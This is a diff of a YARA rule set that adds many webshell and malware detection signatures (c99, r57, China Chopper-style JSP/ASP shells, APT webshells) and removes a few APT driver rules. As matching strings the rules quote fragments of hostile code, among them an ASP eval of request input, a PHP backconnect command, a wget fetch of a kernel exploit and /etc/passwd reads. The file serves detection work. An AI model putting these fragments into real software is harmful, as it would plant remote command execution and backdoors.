+	condition:
+		all of them
+}
+
+rule _root_040_zip_Folder_deploy {
+	meta:
+		description = "Webshells Auto-generated - file deploy.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "2c9f9c58999256c73a5ebdb10a9be269"
+	strings:
+		$s5 = "halon synscan 127.0.0.1 1-65536"
+		$s8 = "Obviously you replace the ip address with that of the target."
+
+	condition:
+		all of them
+}
+
+rule by063cli {
+	meta:
+		description = "Webshells Auto-generated - file by063cli.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "49ce26eb97fd13b6d92a5e5d169db859"
+	strings:
+		$s2 = "#popmsghello,are you all right?"
+		$s4 = "connect failed,check your network and remote ip."
+	condition:
+		all of them
+}
+
+rule icyfox007v1_10_rar_Folder_asp {
+	meta:
+		description = "Webshells Auto-generated - file asp.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "2c412400b146b7b98d6e7755f7159bb9"
+	strings:
+		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
+	condition:
+		all of them
+}
+
+rule byshell063_ntboot_2 {
+	meta:
+		description = "Webshells Auto-generated - file ntboot.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
+	strings:
+		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"
+	condition:
+		all of them
+}
+
+rule u_uay {
+	meta:
+		description = "Webshells Auto-generated - file uay.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
+	strings:
+		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
+		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"
+	condition:
+		1 of them
+}
+
+rule bin_wuaus {
+	meta:
+		description = "Webshells Auto-generated - file wuaus.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "46a365992bec7377b48a2263c49e4e7d"
+	strings:
+		$s1 = "9(90989@9V9^9f9n9v9"
+		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
+		$s3 = ";(=@=G=O=T=X=\\="
+		$s4 = "TCP Send Error!!"
+		$s5 = "1\"1;1X1^1e1m1w1~1"
+		$s8 = "=$=)=/=<=Y=_=j=p=z="
+	condition:
+		all of them
+}
+
+rule pwreveal {
+	meta:
+		description = "Webshells Auto-generated - file pwreveal.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b4e8447826a45b76ca45ba151a97ad50"
+	strings:
+		$s0 = "*<Blank - no es"
+		$s3 = "JDiamondCS "
+		$s8 = "sword set> [Leith=0 bytes]"
+		$s9 = "ION\\System\\Floating-"
+	condition:
+		all of them
+}
+
+rule shelltools_g0t_root_xwhois {
+	meta:
+		description = "Webshells Auto-generated - file xwhois.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "0bc98bd576c80d921a3460f8be8816b4"
+	strings:
+		$s1 = "rting! "
+		$s2 = "aTypCog("
+		$s5 = "Diamond"
+		$s6 = "r)r=rQreryr"
+	condition:
+		all of them
+}
+
+rule vanquish_2 {
+	meta:
+		description = "Webshells Auto-generated - file vanquish.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "2dcb9055785a2ee01567f52b5a62b071"
+	strings:
+		$s2 = "Vanquish - DLL injection failed:"
+	condition:
+		all of them
+}
+
+rule down_rar_Folder_down {
+	meta:
+		description = "Webshells Auto-generated - file down.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "db47d7a12b3584a2e340567178886e71"
+	strings:
+		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"
+	condition:
+		all of them
+}
+
+rule cmdShell {
+	meta:
+		description = "Webshells Auto-generated - file cmdShell.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8a9fef43209b5d2d4b81dfbb45182036"
+	strings:
+		$s1 = "if cmdPath=\"wscriptShell\" then"
+	condition:
+		all of them
+}
+
+rule ZXshell2_0_rar_Folder_nc {
+	meta:
+		description = "Webshells Auto-generated - file nc.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
+	strings:
+		$s0 = "WSOCK32.dll"
+		$s1 = "?bSUNKNOWNV"
+		$s7 = "p@gram Jm6h)"
+		$s8 = "ser32.dllCONFP@"
+	condition:
+		all of them
+}
+
+rule portlessinst {
+	meta:
+		description = "Webshells Auto-generated - file portlessinst.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "74213856fc61475443a91cd84e2a6c2f"
+	strings:
+		$s2 = "Fail To Open Registry"
+		$s3 = "f<-WLEggDr\""
+		$s6 = "oMemoryCreateP"
+	condition:
+		all of them
+}
+
+rule SetupBDoor {
+	meta:
+		description = "Webshells Auto-generated - file SetupBDoor.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "41f89e20398368e742eda4a3b45716b6"
+	strings:
+		$s1 = "\\BDoor\\SetupBDoor"
+	condition:
+		all of them
+}
+
+rule phpshell_3 {
+	meta:
+		description = "Webshells Auto-generated - file phpshell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
+	strings:
+		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
+		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"
+	condition:
+		all of them
+}
+
+rule BIN_Server {
+	meta:
+		description = "Webshells Auto-generated - file Server.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
+	strings:
+		$s0 = "configserver"
+		$s1 = "GetLogicalDrives"
+		$s2 = "WinExec"
+		$s4 = "fxftest"
+		$s5 = "upfileok"
+		$s7 = "upfileer"
+	condition:
+		all of them
+}
+
+rule HYTop2006_rar_Folder_2006 {
+	meta:
+		description = "Webshells Auto-generated - file 2006.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "c19d6f4e069188f19b08fa94d44bc283"
+	strings:
+		$s6 = "strBackDoor = strBackDoor "
+	condition:
+		all of them
+}
+
+rule r57shell_3 {
+	meta:
+		description = "Webshells Auto-generated - file r57shell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "87995a49f275b6b75abe2521e03ac2c0"
+	strings:
+		$s1 = "<b>\".$_POST['cmd']"
+	condition:
+		all of them
+}
+
+rule HDConfig {
+	meta:
+		description = "Webshells Auto-generated - file HDConfig.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "7d60e552fdca57642fd30462416347bd"
+	strings:
+		$s0 = "An encryption key is derived from the password hash. "
+		$s3 = "A hash object has been created. "
+		$s4 = "Error during CryptCreateHash!"
+		$s5 = "A new key container has been created."
+		$s6 = "The password has been added to the hash. "
+	condition:
+		all of them
+}
+
+rule FSO_s_ajan_2 {
+	meta:
+		description = "Webshells Auto-generated - file ajan.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "22194f8c44524f80254e1b5aec67b03e"
+	strings:
+		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
+		$s3 = "/file.zip"
+	condition:
+		all of them
+}
+
+rule Webshell_and_Exploit_CN_APT_HK : Webshell
+{
+meta:
+	author = "Florian Roth"
+	description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
+	date = "10.10.2014"
+	score = 50
+strings:
+	$a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
+	$s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
+	$s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"
+condition:
+	$a0 or ( all of ($s*) )
+}
+
+rule JSP_Browser_APT_webshell {
+	meta:
+		description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
+		author = "F.Roth"
+		date = "10.10.2014"
+		score = 60
+	strings:
+		$a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
+		$a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
+		$a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
+		$a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
+	condition:
+		all of them
+}
+
+rule JSP_jfigueiredo_APT_webshell {
+	meta:
+		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
+		author = "F.Roth"
+		date = "12.10.2014"
+		score = 60
+		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
+	strings:
+		$a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
+		$a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
+	condition:
+		all of them
+}
+
+rule JSP_jfigueiredo_APT_webshell_2 {
+	meta:
+		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
+		author = "F.Roth"
+		date = "12.10.2014"
+		score = 60
+		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
+	strings:
+		$a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
+		$a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
+		$s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
+		$s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
+	condition:
+		all of ($a*) or all of ($s*)
+}
+
+rule AJAX_FileUpload_webshell {
+	meta:
+		description = "AJAX JS/CSS components providing web shell by APT groups"
+		author = "F.Roth"
+		date = "12.10.2014"
+		score = 75
+		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/ajaxfileupload.js"
+	strings:
+		$a1 = "var frameId = 'jUploadFrame' + id;" ascii
+		$a2 = "var form = jQuery('<form  action=\"\" method=\"POST\" name=\"' + formId + '\" id=\"' + formId + '\" enctype=\"multipart/form-data\"></form>');" ascii
+		$a3 = "jQuery(\"<div>\").html(data).evalScripts();" ascii
+	condition:
+		all of them
+}
+
+rule Webshell_Insomnia {
+	meta:
+		description = "Insomnia Webshell - file InsomniaShell.aspx"
+		author = "Florian Roth"
+		reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
+		date = "2014/12/09"
+		hash = "e0cfb2ffaa1491aeaf7d3b4ee840f72d42919d22"
+		score = 80
+	strings:
+		$s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
+		$s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
+		$s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
+		$s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
+		$s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
+		$s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
+		$s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
+		$s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
+	condition:
+		3 of them
+}
+
+rule Webshell_27_9_c66_c99 {
+	meta:
+		description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php ..."
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
+		hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
+		hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
+		hash4 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
+		hash5 = "6ce99e07aa98ba6dc521c34cf16fbd89654d0ba59194878dffca857a4c34e57b"
+		hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
+		hash7 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
+		hash8 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
+		hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
+		hash10 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
+	strings:
+		$s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
+		$s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
+		$s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
+	condition:
+		filesize < 685KB and 1 of them
+}
+
+rule Webshell_acid_AntiSecShell_3 {
+	meta:
+		description = "Detects Webshell Acid"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
+		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
+		hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
+		hash4 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
+		hash5 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
+		hash6 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
+		hash7 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
+		hash8 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
+		hash9 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
+		hash10 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
+		hash11 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
+		hash12 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
+		hash13 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
+		hash14 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
+		hash15 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
+		hash16 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
+		hash17 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
+		hash18 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
+	strings:
+		$s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
+		$s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
+	condition:
+		filesize < 900KB and all of them
+}
+
+rule Webshell_c99_4 {
+	meta:
+		description = "Detects C99 Webshell"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
+		hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
+		hash3 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
+		hash4 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
+		hash5 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
+		hash6 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
+		hash7 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
+		hash8 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
+		hash9 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
+		hash10 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
+		hash11 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
+		hash12 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
+		hash13 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
+		hash14 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
+	strings:
+		$s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
+		$s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
+		$s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
+		$s4 = "$ret = myshellexec($handler);" fullword ascii
+		$s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
+	condition:
+		filesize < 900KB and 1 of them
+}
+
+rule Webshell_r57shell_2 {
+	meta:
+		description = "Detects Webshell R57"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
+		hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
+		hash3 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
+		hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
+		hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
+		hash6 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
+		hash7 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
+		hash8 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
+		hash9 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
+		hash10 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
+		hash11 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
+		hash12 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
+		hash13 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
+	strings:
+		$s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
+		$s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
+	condition:
+		filesize < 900KB and all of them
+}
+
+rule Webshell_27_9_acid_c99_locus7s {
+	meta:
+		description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
+		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
+		hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
+		hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
+		hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
+		hash6 = "5ae121f868555fba112ca2b1a9729d4414e795c39d14af9e599ce1f0e4e445d3"
+		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
+		hash8 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
+	strings:
+		$s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
+		$s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
+	condition:
+		filesize < 1711KB and 1 of them
+}
+
+rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57 {
+	meta:
+		description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
+		hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
+		hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
+		hash4 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
+		hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
+		hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
+		hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
+		hash8 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
+		hash9 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
+		hash10 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
+		hash11 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
+	strings:
+		$s1 = "$_POST['cmd'] = which('" ascii
+		$s2 = "$blah = ex(" fullword ascii
+	condition:
+		filesize < 600KB and all of them
+}
+
+rule Webshell_c100 {
+	meta:
+		description = "Detects Webshell - rule generated from from files c100 v. 777shell"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
+		hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
+		hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
+		hash4 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
+		hash5 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
+		hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
+		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
+	strings:
+		$s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
+		$s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
+		$s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
+		$s4 = "which wget curl w3m lynx" ascii
+		$s6 = "netstat -atup | grep IST"  ascii
+	condition:
+		filesize < 685KB and 2 of them
+}
+
+rule Webshell_AcidPoison {
+	meta:
+		description = "Detects Poison Sh3ll - Webshell"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
+		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
+		hash3 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
+		hash4 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
+		hash5 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
+		hash6 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
+		hash7 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
+		hash8 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
+		hash9 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
+		hash10 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
+	strings:
+		$s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
+	condition:
+		filesize < 550KB and all of them
+}
+
+rule Webshell_Ayyildiz {
+	meta:
+		description = "Detects Webshell - rule generated from from files Ayyildiz Tim  -AYT- Shell v 2.1 Biz.txt, Macker's Private PHPShell.php, matamu.txt, myshell.txt, PHP Shell.txt"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
+		hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
+		hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
+		hash4 = "77a63b26f52ba341dd2f5e8bbf5daf05ebbdef6b3f7e81cec44ce97680e820f9"
+		hash5 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"
+	strings:
+		$s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
+		$s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
+	condition:
+		filesize < 112KB and all of them
+}
+
+rule Webshell_zehir {
+	meta:
+		description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
+		author = "Florian Roth"
+		reference = "https://github.com/nikicat/web-malware-collection"
+		date = "2016-01-11"
+		score = 70
+		hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
+		hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
+		hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
+		hash4 = "b57bf397984545f419045391b56dcaf7b0bed8b6ee331b5c46cee35c92ffa13d"
+		hash5 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
+	strings:
+		$s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
+		$s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
+	condition:
+		filesize < 200KB and 1 of them
 }
 
 rule webshell_ChinaChopper_aspx
@@ -1627,31 +7800,6 @@ rule FVEY_ShadowBrokers_Jan17_Screen_Strings
       filesize < 2000KB and (1 of ($x*) or all of ($a*) or 1 of ($b*) or ( uint16(0) == 0x5a4d and 1 of ($c*) ) or 3 of ($c*) or ( uint16(0) == 0x5a4d and 3 of ($d*) ))
 }
 
-rule Regin_APT_KernelDriver_Generic_C 
-{
-
-    meta:
-        description = "Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2"
-        author = "@Malwrsignatures - included in APT Scanner THOR"
-        date = "23.11.14"
-        hash1 = "e0895336617e0b45b312383814ec6783556d7635"
-        hash2 = "732298fa025ed48179a3a2555b45be96f7079712"      
-
-    strings:
-        $m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 }    
-        $s0 = "KeGetCurrentIrql" fullword ascii
-        $s1 = "5.2.3790.0 (srv03_rtm.030324-2048)" fullword wide
-        $s2 = "usbclass" fullword wide
-        $x1 = "PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" ascii
-        $x2 = "Universal Serial Bus Class Driver" fullword wide
-        $x3 = "5.2.3790.0" fullword wide
-        $y1 = "LSA Shell" fullword wide
-        $y2 = "0Richw" fullword ascii       
-    
-    condition:
-        $m0 at 0 and all of ($s*) and ( all of ($x*) or all of ($y*) )  and filesize < 20KB
-}
-
 rule DarkComet_1 : RAT
 {
     meta:
@@ -1730,48 +7878,6 @@ rule DarkComet_3 : RAT
 		all of ($a*) or all of ($b*)
 }
 
-rule Turla_APT_Malware_Gen3 
-{
-
-    meta:
-        description = "Detects Turla malware (based on sample used in the RUAG APT case)"
-        author = "Florian Roth"
-        family = "Turla"
-        reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
-        date = "2016-06-09"
-        hash1 = "c49111af049dd9746c6b1980db6e150b2a79ca1569b23ed2cba81c85c00d82b4"
-        hash2 = "b62a643c96e2e41f639d2a8ce11d61e6b9d7fb3a9baf011120b7fec1b4ee3cf4"
-        hash3 = "edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348"
-        hash4 = "8f2ea0f916fda1dfb771f5441e919c561da5b6334b9f2fffcbf53db14063b24a"
